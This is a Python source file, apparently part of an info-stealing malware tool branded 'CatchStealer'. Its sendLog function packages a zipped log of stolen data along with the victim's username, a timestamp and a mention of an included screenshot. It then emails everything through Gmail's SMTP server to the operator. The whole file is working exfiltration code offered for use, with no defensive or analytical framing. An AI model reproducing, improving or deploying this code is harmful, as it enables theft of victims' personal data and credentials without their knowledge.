import smtplib
import mimetypes
from email import encoders
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
import getpass


def sendLog(mail, password, logPath, useOtherLog):
	msg = MIMEMultipart()
	msg['From'] = mail
	msg['To'] = mail
	msg['Subject'] = '* | CATCHSTEALER | NEW LOG |*'
	with open(logPath, 'rb') as fp:
			file = MIMEBase("application", "x-zip-compressed")
			file.set_payload(fp.read())
			fp.close()
	encoders.encode_base64(file)
	html = """\
	<html>
		<head>
		</head>
		<body>
			<style>
  				body { background: url(https://media.lpgenerator.ru/uploads/2017/10/17/1.png); }
			</style>
			<center>
				<p><font size="10" color="black" face="Segoe UI Light">Thanks for using CatchStealer</font></p>
				<p><font size="7" color="black" face="Segoe UI Light">New member log</font></p>"""
	if useOtherLog == True:
		html = html + """
		<p><font size="5" color="black" face="Segoe UI Light">Username: """ + getpass.getuser() + """</font></p>
		<p><font size="5" color="black" face="Segoe UI Light">Time: """ + time.strftime("%H:%m:%S") + """</font></p>
		<p><font size="5" color="black" face="Segoe UI Light">Screenshot: On log file</font></p>"""
	html = html + "<p><font size=\"6\" color=\"black\" face=\"Segoe UI Light\">Click on attachment for download logs</font></p>"
	html = html + "<p><font size=\"3\" color=\"black\" face=\"Segoe UI Light\">Made with ❤ by CatchThels</font></p>"
	html = html + """
	</center>
	</body>
	</html>
	"""
	msg.attach(MIMEText(html, 'html', 'utf-8'))  
	msg.attach(file)
	server = smtplib.SMTP('smtp.gmail.com: 587')
	server.starttls()
	server.login(msg['From'], password)
	server.sendmail(msg['From'], msg['To'], msg.as_string())
	server.quit()